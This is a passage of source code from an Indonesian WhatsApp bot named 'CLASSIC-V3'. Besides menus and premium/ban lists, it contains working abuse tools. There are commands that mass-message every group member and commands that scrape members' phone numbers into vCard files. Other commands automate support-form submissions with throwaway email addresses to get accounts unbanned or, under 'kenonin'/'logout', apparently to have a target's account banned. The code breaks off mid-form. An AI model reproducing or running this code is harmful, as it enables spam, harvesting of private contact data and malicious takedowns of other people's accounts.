┃➟ 𝒂𝒏𝒕𝒂𝒓𝒂
┃➟ 𝒌𝒐𝒏𝒕𝒂𝒏
┃➟ 𝒎𝒆𝒓𝒅𝒆𝒌𝒂
┃➟ 𝒋𝒂𝒍𝒂𝒏𝒕𝒊𝒌𝒖𝒔-𝒎𝒆𝒎𝒆
┃┗━━━━━━━━━━━━━━━━━━
┃ ➥➥➥❰*𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024*❱➥➥➥
┗━━━━━━━━━━━━━━━━━━━
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
  body: '⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⸙⫺', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'asupan': {
await loading()
                            ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━━
┃
┃┏━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━━
┃
┃━━━━━━「 SANGE 」━━━━━
┃
┃┏━━━━━━━━━━━━━━━━
┃➟ asupan1
┃➟ asupan2
┃➟ asupan3
┃➟ asupan4
┃➟ asupan5
┃➟ asupan6
┃➟ asupan7
┃➟ asupan8
┃➟ asupan9
┃➟ asupan10
┃➟ asupan11
┃➟ asupan12
┃➟ asupan13
┃➟ asupan14
┃➟ asupan15
┃➟ asupan16
┃➟ asupan17
┃➟ asupan18
┃➟ asupan18
┃➟ asupan20
┃┗━━━━━━━━━━━━━━━━━
┃ ➥➥❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024* ❱➥➥
┗━━━━━━━━━━━━━━━━━━
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
  body: '⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'funmenu':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let fooutgkzz = `Runtime : ⏳ ${runtime(process.uptime())}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} ${salam2}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱
┣❏ᴀʀᴛɪɴᴀᴍᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴀʀᴛɪᴍɪᴍᴘɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ʀᴇᴊᴇᴋɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴘᴇᴋᴇʀᴊᴀᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴀʀᴛɪᴛᴀʀᴏᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ (ᴛᴇxᴛɴʏᴀ)
┣❏ʜᴀʀɪꜱᴀɴɢᴀʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ʜᴀʀɪʙᴀɪᴋ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜰᴇɴɢꜱʜᴜɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ɴᴀɢᴀʜᴀʀɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ʜᴀʀɪɴᴀᴀꜱ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴡᴇᴛᴏɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴀʀᴀʜʀᴇᴊᴇᴋɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱɪꜰᴀᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴍᴇᴍᴀɴᴄɪɴɢ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴍᴀꜱᴀꜱᴜʙᴜʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴢᴏᴅɪᴀᴋ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱʜɪᴏ (ᴛᴇxᴛɴʏᴀ)
┗━━⊱`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fooutgkzz, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": rimuwu,
"mediaUrl": gr,
"sourceUrl": gr,
}
}
})
break
case 'gamemenu':
await loading()
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let fooutgdhsikzz = `Runtime : ⏳ ${runtime(process.uptime())}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} ${salam2}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱
┣❏ᴛᴛᴄ
┣❏ᴅᴇʟᴛᴄ
┣❏ꜱᴜɪᴛᴘᴠᴘ
┣❏ᴛᴇʙᴀᴋ ᴋᴀᴛᴀ
┣❏ᴛᴇʙᴀᴋ ɢᴀᴍʙᴀʀ
┣❏ᴛᴇʙᴀᴋ ʟɪʀɪᴋ
┣❏ᴛᴇʙᴀᴋ ᴋᴀʟɪᴍᴀᴛ
┣❏ᴛᴇʙᴀᴋ ʟᴀɢᴜ
┣❏ᴛᴇʙᴀᴋ ʟᴏɴᴛᴏɴɢ
┣❏ꜰᴀᴍɪʟʏ100
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɴᴏᴏʙ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴇᴀꜱʏ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴍᴇᴅɪᴜᴍ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ʜᴀʀᴅ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴇxᴛʀᴇᴍᴇ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ
┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ2
┗━━⊱`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": fooutgdhsikzz, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": rimuwu,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'pushcontid':{
if (!isCreator) return reply('*Premium Only*')
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await zetsubo.groupMetadata(idgc).catch((e) => reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
reply(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
zetsubo.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
zetsreply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 2000);
}
}
break;
//=================================================//
case "cekidgc": {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*') 
reply('Bentar Ya')
let getGroups = await zetsubo.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `➟ *List Grub Lu*\n\n💺Total Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await zetsubo.groupMetadata(x)
teks += `⿻ *INFO GROUP*\n┃➟ *NAMA :* ${metadata2.subject}\n┃➟ *ID :* ${metadata2.id}\n┃➟ *MEMBER :* ${metadata2.participants.length}\n╰────|⿻\n\n`
            }reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'pushkontak':{
if (!isCreator) return reply('*Premium Only*')
if (!m.isGroup) return reply(`di group coy`)
if (!text) return reply(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 2 } detik*`)
for (let geek of mem) {
await sleep(1000)
zetsubo.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
zetsreply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case "savekontak": {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*') 
await m.reply('wait')
const groupMetadata = m.isGroup? await zetsubo.groupMetadata(from).catch(e => {}) : ""
const groupOwner = m.isGroup? groupMetadata.owner : ""
const participantts = m.isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
svcontact.push(men)
fs.writeFileSync('./pushkont/contacts.json', JSON.stringify(svcontact))
}
zetsreply("𖤹 Succes, File Save Kontaknya Sudah Di Send Ke Chat Pribadi")
try {
const uniqueContacts = [...new Set(svcontact)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./pushkont/contacts.vcf", vcardContent, "utf8");
} catch (err) {
m.reply(util.format(err))
} finally {
await zetsubo.sendMessage(m.sender, { document: fs.readFileSync("./pushkont/contacts.vcf"), fileName: "contacts.vcf", caption: "𖤹 Nih Filenya Beb:3 !!! ", mimetype: "text/vcard", }, { quoted: m })
zetsubo.sendMessage(m.sender, {text : `𖤹 Cara Menggunakan =
 ➟ Download Filenya
 ➟ Lalu Pencet Filenya
 ➟ Import Ke Kontak
 ➟ Pilih Email Yang Akan Digunakan

𖤛 Selesai `}, {quoted: zets })
svcontact.splice(0, contacts.length)
fs.writeFileSync("./pushkont/contacts.json", JSON.stringify(contacts))
}
}
break
case "savekontakid": {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*') 
if (!text) return m.reply(`GAK GITU CARANYA BEGO!!
KEK GINI CARANYA = 
 ketik kan seperti ini
.savekontakid IDGC

untuk melihat id ketik .cekidgc`)
await m.reply(`Proses.....`)
const groupMetadataa = !m.isGroup? await zetsubo.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
svcontact.push(mem)
fs.writeFileSync('./pushkont/contacts.json', JSON.stringify(svcontact))
}
try {
const uniqueContacts = [...new Set(svcontact)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./pushkont/contacts.vcf", vcardContent, "utf8");
} catch (err) {
m.reply(util.format(err))
} finally {
await zetsubo.sendMessage(m.sender, { document: fs.readFileSync("./pushkont/contacts.vcf"), fileName: "contacts.vcf", caption: "𖤹 Nih Filenya Beb:3 !!! ", mimetype: "text/vcard", }, { quoted: m })
zetsubo.sendMessage(m.sender, {text : `𖤹 Cara Menggunakan =
 ➟ Download Filenya
 ➟ Lalu Pencet Filenya
 ➟ Import Ke Kontak
 ➟ Pilih Email Yang Akan Digunakan

𖤛 Selesai `}, {quoted: zets })
svcontact.splice(0, contacts.length)
fs.writeFileSync("./pushkont/contacts.json", JSON.stringify(contacts))
}
}
break
//=================================================//
case 'public': {
if (!isCreator) return reply('*Premium Command*') 
zetsubo.public = true
zetsreply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return reply('*Premium Command*') 
zetsubo.public = false
zetsreply('Sukses Change To Self')
}
break
//=================================================//
case 'addprem':
if (!isCreator) return reply('*Premium Command*')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 258869103969`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await zetsubo.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./premium.json', JSON.stringify(owner))
zetsreply(`Nomor ${bnnd} Telah Sudah Premium!!!`)
break
//=================================================//
case 'delprem':
if (!isCreator) return reply('*Premium Command*')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 258869103969`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./premium.json', JSON.stringify(owner))
zetsreply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
break
//=================================================//
case 'listprem':
if (isBan) return reply('*Lu Di Ban Owner*')
 teksooo = '*List Premium*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
zetsubo.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break
//=================================================//
case 'pengguna':  {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!args[0]) return reply(`*Contoh : ${command} add 258869103969*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*Pengguna Ini telah Di Ban*')
banned.push(orgnye)
reply(`Succes ban Pengguna Ini`)
} else if (args[0] === "del") {
if (!isBane) return reply('*Pengguna Ini Telah Di hapus Dari Ban*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
zetsreply(`*Berhasil Menghapus Pengguna yang Di Ban*`)
} else {
reply("Error")
}
}
break
//=================================================//
case 'listban':
if (isBan) return reply('*Lu Di Ban Owner*')
 teksooop = `*List Ban*\n\n`
for (let ii of banned) {
teksooop += `- ${ii}\n`
}
zetsreply(teksooop)
break
//=================================================//
case 'owner': case 'creator':{
 zetsubo.sendContact(from, global.owner, m)
}
break
//=================================================//
case 'unbanv1': {
if (!isCreator) return reply('*Premium Command*')
await loading()
if (Input) {
let cekno = await zetsubo.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bego-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban1}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
zetsreply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
zetsreply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
zetsreply(`Sedang Limit Tunggu Beberapa Saat.`)
zetsreply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Targetnya Sayang\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
case 'unbanv2': {
if (!isCreator) return reply('*Premium Command*')
await loading()
if (Input) {
let cekno = await zetsubo.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bego-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban2}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
zetsreply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
zetsreply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
zetsreply(`Sedang Limit Tunggu Beberapa Saat.`)
zetsreply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Targetnya Sayang\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
case 'unbanv3': {
if (!isCreator) return reply('*Premium Command*')
await loading()
if (Input) {
let cekno = await zetsubo.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bego-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban3}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
zetsreply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
zetsreply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
zetsreply(`Sedang Limit Tunggu Beberapa Saat.`)
zetsreply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Targetnya Sayang\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
case 'unbanv4': {
if (!isCreator) return reply('*Premium Command*')
await loading()
if (Input) {
let cekno = await zetsubo.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bego-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban4}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
zetsreply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
zetsreply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
zetsreply(`Sedang Limit Tunggu Beberapa Saat.`)
zetsreply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Targetnya Sayang\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
case 'unbanv5': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
if (Input) {
let cekno = await zetsubo.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bego-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban5}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
zetsreply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
zetsreply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
zetsreply(`Sedang Limit Tunggu Beberapa Saat.`)
zetsreply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Targetnya Sayang\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
case 'kenonin': case 'logout': {
if (!isCreator) return reply('*Premium Command*')
await loading()
if (Input) {
let cekno = await zetsubo.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bego-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
